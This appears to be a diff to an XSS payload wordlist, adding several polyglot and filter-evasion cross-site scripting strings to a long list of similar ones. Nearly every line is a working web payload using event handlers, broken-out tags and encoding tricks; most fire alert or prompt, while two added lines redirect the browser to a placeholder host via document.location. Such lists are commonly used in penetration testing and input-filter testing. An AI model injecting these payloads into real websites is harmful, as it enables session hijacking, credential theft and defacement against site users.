@@ -1,3 +1,4 @@
+" onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//
 "'`><\x00img src=xxx:x onerror=javascript:alert(1)>
 "'`><\x3Cimg src=xxx:x onerror=javascript:alert(1)>
 "'`><p><svg><script>a='hello\x27;javascript:alert(1)//';</script></p>
@@ -15,6 +16,7 @@
 "></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
 "><iframe src="javascript:alert(XSS)">
 "><img src="x:x" onerror="alert(XSS)">
+">><marquee><img src=x onerror=confirm(1)></marquee>" ></plaintext\></|\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->" ></script><script>alert(1)</script>"><img/id="confirm( 1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http: //i.imgur.com/P8mL8.jpg">
 "`'><script>-javascript:alert(1)</script>
 "`'><script>\x00javascript:alert(1)</script>
 "`'><script>\x09javascript:alert(1)</script>
@@ -52,12 +54,16 @@
 "`'><script>\xEF\xBF\xAEjavascript:alert(1)</script>
 "`'><script>\xEF\xBF\xBEjavascript:alert(1)</script>
 "`'><script>\xF0\x90\x96\x9Ajavascript:alert(1)</script>
+%0ajavascript:`/*\"/*-->&lt;svg onload='/*</template></noembed></noscript></style></title></textarea></script><html onmouseover="/**/ alert(test)//'">`
 '">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http://i.imgur.com/P8mL8.jpg">
 '"`><script>/* *\x2Fjavascript:alert(1)// */</script>
+';alert(String.fromCharCode(88,83,83))//';alert(String. fromCharCode(88,83,83))//";alert(String.fromCharCode (88,83,83))//";alert(String.fromCharCode(88,83,83))//-- ></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83)) </SCRIPT>
 ';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
 '`"><\x00script>javascript:alert(1)</script>
 '`"><\x3Cscript>javascript:alert(1)</script>
 +ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
+-->'"/></sCript><deTailS open x=">" ontoggle=(co\u006efirm)``>
+-->'"/></sCript><svG x=">" onload=(co\u006efirm)``>
 --><!-- ---> <img src=xxx:x onerror=javascript:alert(1)> -->
 --><!-- --\x00> <img src=xxx:x onerror=javascript:alert(1)> -->
 --><!-- --\x21> <img src=xxx:x onerror=javascript:alert(1)> -->
@@ -483,6 +489,7 @@
 <svg onUnload svg onUnload="javascript:javascript:alert(1)"></svg onUnload>
 <svg onload svg onload="javascript:javascript:alert(1)"></svg onload>
 <svg onunload svg onunload="javascript:javascript:alert(1)"></svg onunload>
+<svg%0Ao%00nload=%09((pro\u006dpt))()//
 <svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script
 <table background="javascript:javascript:alert(1)">
 <title onPropertyChange title onPropertyChange="javascript:javascript:alert(1)"></title onPropertyChange>
@@ -552,9 +559,12 @@ X<x style=`behavior:url(#default#time2)` onbegin=`javascript:alert(1)` >
 `"'><img src=xxx:x onerror\x20=javascript:alert(1)>
 data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K
 exp/*<A STYLE='no\xss:noxss("*//*");
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
 jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
 jaVasCript:/*`/*\`/*'/*\"//"/**/(onload=alert())//<svg/onload=alert()><frame/onload=alert()></select></noscript></noembed></template></stYle/</titLe/</teXtarEa/</script/--><sVg/oNloAd= alert()//>
 javascript:"/*'/*\"/*` /**/alert()//--></title></textarea></style></noscript></noembed></template></script><script>alert()</script><svg/<frame/onload=alert()>
+javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
+javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=document.location=`//localhost/mH`//>
 javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*<svg/*/onload=alert()//>
 javascript:"/*'/*`/*\" /*</title></style></textarea></noscript></noembed></template></script/--><svg/onload=/*<html/*/onmouseover=alert()//>
 javascript:"/*'//`//\"//</template/</title/</textarea/</style/</noscript/</noembed/</script/--><script>/<i<frame */ onload=alert()//</script>
@@ -579,6 +589,7 @@ javascript:/*-->'//"//`//\"//</title></textarea></style></noscript></script></no
 javascript:/*--></script></textarea></style></noscript>\"</noembed>[`</template>["</select>['</title>]<<script>///<frame */ onload=alert()//<</script>
 javascript:/*--></title></style></template></noscript></noembed></textarea></script><svg/onload='+/"/+/onclick=1/+/[*/[]/+alert()//'>"><svg/onload=`+/"/+/onclick=/+/[*/[]/+alert()//'>"><script>alert()</script><frame src="javascript:alert()"></frameset>+\"; alert()//<img src onerror=alert()>
 javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+document.location=`//localhost/mH`//'>
 javascript:/*`/*'/*'/*"-/*\"/**/ alert()//></title></textarea></style></select></script></noembed></noscript></template>--><<svg/onload=alert()><frame/src=javascript:alert()>
 javascript:/*`//'//\"//</style></noscript></script>--></textarea></noembed></template></title><script>/<frame <svg"///*/ onload=alert()//</script>
 javascript://'//" --></textarea></style></script></title><b onclick= alert()//>*/alert()/*
